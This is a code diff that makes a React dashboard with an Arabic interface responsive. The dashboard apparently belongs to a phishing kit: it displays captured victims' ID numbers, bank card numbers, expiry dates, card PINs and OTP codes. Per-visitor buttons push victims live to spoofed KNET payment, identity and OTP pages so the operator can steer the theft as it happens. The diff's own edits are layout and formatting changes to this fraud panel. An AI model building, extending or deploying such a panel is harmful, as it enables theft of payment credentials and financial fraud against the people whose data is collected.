@@ -39,7 +39,7 @@ interface Notification {
   bank_card: string
   cardNumber: string
   cardStatus: string
-  ip?: string;
+  ip?: string
   createdDate: string
   cvv: string
   id: string | "0"
@@ -49,7 +49,7 @@ interface Notification {
   otp2: string
   page: string
   pass: string
-  country?:string
+  country?: string
   personalInfo: {
     id?: string | "0"
   }
@@ -297,7 +297,7 @@ export default function NotificationsPage() {
         </div>
 
         {/* Statistics Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
           {/* Online Users Card */}
           <div className="bg-white rounded-lg shadow p-4 flex items-center">
             <div className="rounded-full bg-blue-100 p-3 mr-4">
@@ -321,7 +321,7 @@ export default function NotificationsPage() {
           </div>
 
           {/* Card Submissions Card */}
-          <div className="bg-white rounded-lg shadow p-4 flex items-center">
+          <div className="bg-white rounded-lg shadow p-4 flex items-center sm:col-span-2 md:col-span-1">
             <div className="rounded-full bg-purple-100 p-3 mr-4">
               <CreditCard className="h-6 w-6 text-purple-500" />
             </div>
@@ -332,124 +332,234 @@ export default function NotificationsPage() {
           </div>
         </div>
 
-        <div className="bg-gray-100 rounded-lg overflow-x-auto">
-          <table className="w-full">
-            <thead>
-              <tr className="border-b border-gray-100">
-                <th className="px-4 py-3 text-right">الدوله</th>
-                <th className="px-4 py-3 text-right">الإسم</th>
-                <th className="px-4 py-3 text-right">المعلومات</th>
-                <th className="px-4 py-3 text-right">الصفحة الحالية</th>
-                <th className="px-4 py-3 text-right">الوقت</th>
-                <th className="px-4 py-3 text-center">الاشعارات</th>
-                <th className="px-4 py-3 text-center">تحديث الصفحة</th>
-                <th className="px-4 py-3 text-center">حذف</th>
-              </tr>
-            </thead>
-            <tbody>
-              {notifications.map((notification) => (
-                <tr key={notification.id} className="border-b border-gray-700">
-                  <td className="px-4 py-3">{notification?.country!}</td>
-                  <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
-                  <td className="px-4 py-3">
-                    <div className="flex flex-col sm:flex-row gap-2">
-                      <Badge
-                        variant={notification.personalInfo?.id! ? "default" : "destructive"}
-                        className="rounded-md cursor-pointer"
-                        onClick={() => handleInfoClick(notification, "personal")}
+        <div className="bg-gray-100 rounded-lg">
+          {/* Desktop Table View - Hidden on Mobile */}
+          <div className="hidden md:block overflow-x-auto">
+            <table className="w-full">
+              <thead>
+                <tr className="border-b border-gray-100">
+                  <th className="px-4 py-3 text-right">الدوله</th>
+                  <th className="px-4 py-3 text-right">الإسم</th>
+                  <th className="px-4 py-3 text-right">المعلومات</th>
+                  <th className="px-4 py-3 text-right">الصفحة الحالية</th>
+                  <th className="px-4 py-3 text-right">الوقت</th>
+                  <th className="px-4 py-3 text-center">الاشعارات</th>
+                  <th className="px-4 py-3 text-center">تحديث الصفحة</th>
+                  <th className="px-4 py-3 text-center">حذف</th>
+                </tr>
+              </thead>
+              <tbody>
+                {notifications.map((notification) => (
+                  <tr key={notification.id} className="border-b border-gray-700">
+                    <td className="px-4 py-3">{notification?.country!}</td>
+                    <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
+                    <td className="px-4 py-3">
+                      <div className="flex flex-col sm:flex-row gap-2">
+                        <Badge
+                          variant={notification.personalInfo?.id! ? "default" : "destructive"}
+                          className="rounded-md cursor-pointer"
+                          onClick={() => handleInfoClick(notification, "personal")}
+                        >
+                          {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
+                        </Badge>
+                        <Badge
+                          variant={notification.cardNumber ? "default" : "destructive"}
+                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                          onClick={() => handleInfoClick(notification, "card")}
+                        >
+                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                        </Badge>
+                        <Badge
+                          variant={"secondary"}
+                          className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
+                          onClick={() => handleInfoClick(notification, "personal")}
+                        >
+                          <InfoIcon className="h-4 w-4 mr-1" />
+                          معلومات عامة
+                        </Badge>
+                      </div>
+                    </td>
+                    <td className="px-4 py-3">خطوه - {notification.page}</td>
+                    <td className="px-4 py-3">
+                      {notification.createdDate &&
+                        formatDistanceToNow(new Date(notification.createdDate), {
+                          addSuffix: true,
+                          locale: ar,
+                        })}
+                    </td>
+                    <td className="px-4 py-3 text-center">
+                      <UserStatusBadge userId={notification.id} />
+                    </td>
+                    <td className="px-4 py-3 text-center">
+                      <div className="flex flex-col items-center space-y-2">
+                        <div className="flex justify-center space-x-2">
+                          {[
+                            {
+                              page: "main",
+                              label: "الرئيسية",
+                              hint: "الصفحة الرئيسية",
+                            },
+                            { page: "knet", label: "كنت", hint: "صفحة كنت" },
+
+                            {
+                              page: "sahel",
+                              label: "هوية",
+                              hint: "هوية",
+                            },
+                          ].map(({ page, label, hint }) => (
+                            <Button
+                              key={page}
+                              variant={notification?.page === page ? "default" : "outline"}
+                              size="sm"
+                              onClick={() => handleUpdatePage(notification.id, page)}
+                              className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
+                              title={hint}
+                            >
+                              {label}
+                              {notification.page === page && (
+                                <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
+                                  ✓
+                                </span>
+                              )}
+                            </Button>
+                          ))}
+                        </div>
+                        <span className="text-xs text-gray-500">
+                          {notification.page === "main" && "الصفحة الرئيسية"}
+                          {notification.page === "knet" && "صفحة كنت"}
+                          {notification.page === "phone" && "رقم الهاتف "}
+                          {notification.page === "phoneOtp" && " OTP"}
+                          {notification.page === "sahel" && "هوية"}
+                        </span>
+                      </div>
+                    </td>
+                    <td className="px-4 py-3 text-center">
+                      <Button
+                        variant="destructive"
+                        size="sm"
+                        onClick={() => handleDelete(notification.id)}
+                        className="bg-red-500 hover:bg-red-600"
                       >
-                        {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
-                      </Badge>
-                      <Badge
-                        variant={notification.cardNumber ? "default" : "destructive"}
-                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
-                        onClick={() => handleInfoClick(notification, "card")}
-                      >
-                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                      </Badge>
-                      <Badge
-                        variant={"secondary"}
-                        className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
-                        onClick={() => handleInfoClick(notification, "personal")}
-                      >
-                        <InfoIcon className="h-4 w-4 mr-1" />
-                        معلومات عامة
-                      </Badge>
-                    </div>
-                  </td>
-                  <td className="px-4 py-3">خطوه - {notification.page}</td>
-                  <td className="px-4 py-3">
+                        <Trash2 className="h-4 w-4" />
+                      </Button>
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+
+          {/* Mobile Card View - Shown only on Mobile */}
+          <div className="md:hidden space-y-4 p-2">
+            {notifications.map((notification) => (
+              <div key={notification.id} className="bg-white rounded-lg shadow-md p-4">
+                <div className="flex justify-between items-start mb-3">
+                  <div>
+                    <div className="font-semibold">{notification.personalInfo?.id!}</div>
+                    <div className="text-sm text-gray-500">{notification?.country!}</div>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <UserStatusBadge userId={notification.id} />
+                    <Button
+                      variant="destructive"
+                      size="sm"
+                      onClick={() => handleDelete(notification.id)}
+                      className="bg-red-500 hover:bg-red-600 h-8 w-8 p-0"
+                    >
+                      <Trash2 className="h-4 w-4" />
+                    </Button>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 gap-2 mb-3">
+                  <div className="flex flex-wrap gap-2">
+                    <Badge
+                      variant={notification.personalInfo?.id! ? "default" : "destructive"}
+                      className="rounded-md cursor-pointer"
+                      onClick={() => handleInfoClick(notification, "personal")}
+                    >
+                      {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
+                    </Badge>
+                    <Badge
+                      variant={notification.cardNumber ? "default" : "destructive"}
+                      className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                      onClick={() => handleInfoClick(notification, "card")}
+                    >
+                      {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                    </Badge>
+                    <Badge
+                      variant={"secondary"}
+                      className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
+                      onClick={() => handleInfoClick(notification, "personal")}
+                    >
+                      <InfoIcon className="h-4 w-4 mr-1" />
+                      معلومات عامة
+                    </Badge>
+                  </div>
+
+                  <div className="text-sm">
+                    <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
+                  </div>
+
+                  <div className="text-sm">
+                    <span className="font-medium">الوقت:</span>{" "}
                     {notification.createdDate &&
                       formatDistanceToNow(new Date(notification.createdDate), {
                         addSuffix: true,
                         locale: ar,
                       })}
-                  </td>
-                  <td className="px-4 py-3 text-center">
-                    <UserStatusBadge userId={notification.id} />
-                  </td>
-                  <td className="px-4 py-3 text-center">
-                    <div className="flex flex-col items-center space-y-2">
-                      <div className="flex justify-center space-x-2">
-                        {[
-                          {
-                            page: "main",
-                            label: "الرئيسية",
-                            hint: "الصفحة الرئيسية",
-                          },
-                          { page: "knet", label: "كنت", hint: "صفحة كنت" },
-                    
-                          {
-                            page: "sahel",
-                            label: "هوية",
-                            hint: "هوية",
-                          },
-                        ].map(({ page, label, hint }) => (
-                          <Button
-                            key={page}
-                            variant={notification?.page === page ? "default" : "outline"}
-                            size="sm"
-                            onClick={() => handleUpdatePage(notification.id, page)}
-                            className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
-                            title={hint}
-                          >
-                            {label}
-                            {notification.page === page && (
-                              <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
-                                ✓
-                              </span>
-                            )}
-                          </Button>
-                        ))}
-                      </div>
-                      <span className="text-xs text-gray-500">
-                        {notification.page === "main" && "الصفحة الرئيسية"}
-                        {notification.page === "knet" && "صفحة كنت"}
-                        {notification.page === "phone" && "رقم الهاتف "}
-                        {notification.page === "phoneOtp" && " OTP"}
-                        {notification.page === "sahel" && "هوية"}
-                      </span>
-                    </div>
-                  </td>
-                  <td className="px-4 py-3 text-center">
-                    <Button
-                      variant="destructive"
-                      size="sm"
-                      onClick={() => handleDelete(notification.id)}
-                      className="bg-red-500 hover:bg-red-600"
-                    >
-                      <Trash2 className="h-4 w-4" />
-                    </Button>
-                  </td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
+                  </div>
+                </div>
+
+                <div className="border-t pt-3">
+                  <div className="text-sm font-medium mb-2">تحديث الصفحة:</div>
+                  <div className="flex flex-wrap gap-2">
+                    {[
+                      {
+                        page: "main",
+                        label: "الرئيسية",
+                        hint: "الصفحة الرئيسية",
+                      },
+                      { page: "knet", label: "كنت", hint: "صفحة كنت" },
+                      {
+                        page: "sahel",
+                        label: "هوية",
+                        hint: "هوية",
+                      },
+                    ].map(({ page, label, hint }) => (
+                      <Button
+                        key={page}
+                        variant={notification?.page === page ? "default" : "outline"}
+                        size="sm"
+                        onClick={() => handleUpdatePage(notification.id, page)}
+                        className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
+                        title={hint}
+                      >
+                        {label}
+                        {notification.page === page && (
+                          <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
+                            ✓
+                          </span>
+                        )}
+                      </Button>
+                    ))}
+                  </div>
+                  <div className="text-xs text-gray-500 mt-1">
+                    {notification.page === "main" && "الصفحة الرئيسية"}
+                    {notification.page === "knet" && "صفحة كنت"}
+                    {notification.page === "phone" && "رقم الهاتف "}
+                    {notification.page === "phoneOtp" && " OTP"}
+                    {notification.page === "sahel" && "هوية"}
+                  </div>
+                </div>
+              </div>
+            ))}
+          </div>
         </div>
       </div>
 
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="bg-gray-100 text-black" dir="rtl">
+        <DialogContent className="bg-gray-100 text-black max-w-[90vw] md:max-w-md" dir="rtl">
           <DialogHeader>
             <DialogTitle dir="rtl">
               {selectedInfo === "personal"
@@ -471,8 +581,7 @@ export default function NotificationsPage() {
               <p>
                 <strong>رقم الهوية:</strong> {selectedNotification.idNumber}
               </p>
-              <p>
-              </p>
+              <p></p>
             </div>
           )}
           {selectedInfo === "card" && selectedNotification && (
@@ -483,7 +592,7 @@ export default function NotificationsPage() {
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
                 {selectedNotification.cardNumber &&
-                  selectedNotification.cardNumber  +" - "+ selectedNotification.prefix}
+                  selectedNotification.cardNumber + " - " + selectedNotification.prefix}
               </p>
               <p>
                 <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
@@ -492,8 +601,8 @@ export default function NotificationsPage() {
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
-             <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp2! }
+              <p className="flex items-center">
+                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp2!}
               </p>
             </div>
           )}
@@ -540,10 +649,8 @@ export default function NotificationsPage() {
                 >
                   رفض
                 </Button>
-
               </div>
               <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
-
             </div>
           )}
         </DialogContent>
